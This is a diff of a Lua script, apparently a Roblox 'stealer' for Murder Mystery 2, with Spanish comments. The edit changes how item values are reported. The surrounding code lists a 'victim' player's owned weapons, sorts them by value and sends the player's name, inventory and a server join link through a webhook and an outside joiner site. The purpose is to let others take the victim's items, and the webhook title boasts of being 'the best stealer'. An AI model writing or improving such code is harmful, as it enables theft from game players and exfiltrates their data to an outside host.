@@ -184,10 +184,10 @@ for id, amount in pairs(profile.Weapons.Owned) do
     end
 end
 
--- Ordenar armas de mayor a menor por valor
+-- Ordenar armas de mayor a menor por valor total
 table.sort(weaponsToSend, function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- Enviar webhook con victim
+-- Enviar webhook con victim y valor total por item
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
     {name="Victim", value=LocalPlayer.Name, inline=true},
@@ -196,7 +196,8 @@ local fields = {
     {name="Total value", value=tostring(totalValue), inline=true}
 }
 for _, w in ipairs(weaponsToSend) do
-    fields[3].value = fields[3].value .. string.format("%s x%s (%s) | Value: %s\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value))
+    local totalItemValue = w.Value * w.Amount
+    fields[3].value = fields[3].value .. string.format("%s x%s (%s) | Value: %s\n", w.DataID, w.Amount, w.Rarity, tostring(totalItemValue))
 end
 local prefix = _G.pingEveryone == "Yes" and "@everyone " or ""
 SendWebhook("💪MM2 Hit el mejor stealer💯", "💰Disfruta todas las armas gratis 😎", fields, prefix)
